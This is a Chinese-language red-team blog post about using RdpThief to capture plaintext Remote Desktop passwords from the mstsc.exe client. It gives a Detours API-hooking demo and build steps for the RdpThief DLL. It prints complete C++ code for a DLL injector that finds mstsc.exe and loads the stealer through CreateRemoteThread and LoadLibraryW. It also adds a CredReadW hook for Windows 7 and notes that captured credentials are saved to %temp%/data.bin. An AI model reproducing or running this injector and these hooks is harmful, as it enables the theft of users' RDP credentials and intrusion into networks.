---
layout:     post
title:    mstsc中提取明文凭据-RdpThief实践
subtitle:   RdpThief实践
date:       2019-12-24
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 后门
    - 红队
    - 内网渗透
---
# 从mstsc中提取明文凭据-RdpThief实践

## 简介
尝试使用RdpThief从远程桌面客户端提取明文凭据，通过读取运行过程中mstsc的内存数据，监控API调用，找到后hook对应API，从中导出存储的明文口令。  

## 准备工作
首先先需要安装Detours库。  
Detours库用于监视和检测Windows上的API调用，可以用来hook系统API。  
这里我用的是vs2015，直接通过命令安装了：  
```
vs2015->工具->NuGet包管理器->程序包管理器控制台 
Install-Package Detours  
```
![191224_2](/img/191220_installdetours.png)  
通过一个小小的demo演示下hook。   
```
#include <Windows.h>
#include <detours.h> //加载detours库
#pragma comment (lib,"detours.lib")
static int(WINAPI *TrueMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT) = MessageBox; //根据函数原型来定义要被HOOk的函数（MSDN函数怎么写的你就怎么定义）
int WINAPI OurMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType) { //成功HOOK后的处理函数
    return TrueMessageBox(NULL, L"Hooked", lpCaption, 0); //HOOK messagebox
}
int main()
{
    DetourTransactionBegin(); //初始化
    DetourUpdateThread(GetCurrentThread()); 
    DetourAttach(&(PVOID&)TrueMessageBox, OurMessageBox);  //加载要HOOK的函数
    DetourTransactionCommit(); //开始HOOK
    MessageBox(NULL, L"Hello", L"Hello", 0);
    DetourTransactionBegin(); //HOOK初始化
    DetourUpdateThread(GetCurrentThread()); //刷新本身线程
    DetourDetach(&(PVOID&)TrueMessageBox, OurMessageBox);  //取消HOOK
    DetourTransactionCommit(); //取消HOOK开始
}
```  
编译运行：  
![191224_1](/img/191220_hook.png)  
## 编译RdpThief
先去下载项目文件，项目地址[https://github.com/0x09AL/RdpThief](https://github.com/0x09AL/RdpThief)  
vs2015 有可能碰到由于工具集问题导致编译失败的情况，在项目属性中的常规项中修改工具集平台为v140。  
![191224_3](/img/191220_v141.png)  
编译成功后就可以得到一个dll文件。  
接下来就是要将这个dll注入到对一个的mstsc进程里面。  

## dll 注入 
这里为了方便自动化，直接先通过进程名搜索pid，然后向对应pid进程注入dll。  
这里直接把我的代码贴了：  
```
// detourstest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "Windows.h"
#include <detours.h>
#include <string.h>
#include <tlhelp32.h>
#pragma comment (lib,"detours.lib")

#define ArraySize(ptr)    (sizeof(ptr) / sizeof(ptr[0]))
/*
static int(WINAPI *TrueMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT) = MessageBox;
int WINAPI OurMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType) {
	return TrueMessageBox(NULL, L"Hooked", lpCaption, 0);
}
int main()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)TrueMessageBox, OurMessageBox);
	DetourTransactionCommit();
	MessageBox(NULL, L"Hello", L"Hello", 0);
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)TrueMessageBox, OurMessageBox);
	DetourTransactionCommit();
}
*/


BOOL FindProcessPid(LPCWSTR ProcessName, DWORD& dwPid);


int main()
{
	LPCWSTR Name = L"mstsc.exe";
	// StopMyService();
	DWORD dwPid = 0;
	HANDLE ProcessHandle;
	PVOID RemoteBuffer;
	wchar_t DllPath[] = TEXT("C:\\RdpThief.dll");




	if (FindProcessPid(Name, dwPid))
	{
		//printf("[%ls] [%d]\n",Name, dwPid);
		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
		RemoteBuffer = VirtualAllocEx(ProcessHandle, NULL, sizeof DllPath, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(ProcessHandle, RemoteBuffer, (LPVOID)DllPath, sizeof DllPath, NULL);
		PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
		CreateRemoteThread(ProcessHandle, NULL, 0, threatStartRoutineAddress, RemoteBuffer, 0, NULL);
		CloseHandle(ProcessHandle);

	}
	else
	{
		printf("[%ls] [Not Found]\n", Name);
	}
	
	return 0;
}

BOOL FindProcessPid(LPCWSTR ProcessName, DWORD& dwPid)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return(FALSE);
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);          // clean the snapshot object
		return(FALSE);
	}

	BOOL    bRet = FALSE;
	do
	{
		if (!lstrcmp(ProcessName, pe32.szExeFile))
		{
			dwPid = pe32.th32ProcessID;
			bRet = TRUE;
			break;
		}

	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return bRet;
}
```
编译以后测试下。  
用Process Explorer看下是否注入成功。  
![191224_4](/img/191220_injectDll.png)  
然后正常登录，无论成功与否，都是会记录下来保存在%temp%/data.bin文件中。  
![191224_5](/img/191220_data.png)  


## 注意
我这里测试的是win10下，根据几个老师傅的测试win7下是不存在SspiPrepareForCredRead这个API，自然就无法将登录服务器的ip记录下来，需要修改RdpThief的代码，通过CredReadW这个API去获取对应的ip。  
所以只需要在源代码中增加对CredReadW的hook即可。  
```
static BOOL(WINAPI *OriginalCredReadW)(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential) = CredReadW;
BOOL HookedCredReadW(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential)
{
	lpServer = TargetName;
	return OriginalCredReadW(TargetName, Type, Flags, Credential);
}
```
不要忘了attach加载hook和detach取消hook。  

## 补充
对应的代码我已经放在github上了，win7的暂时没测试，只是参考改了下，能编译通过。  
项目地址：[https://github.com/hmoytx/RdpThief_tools](https://github.com/hmoytx/RdpThief_tools)  
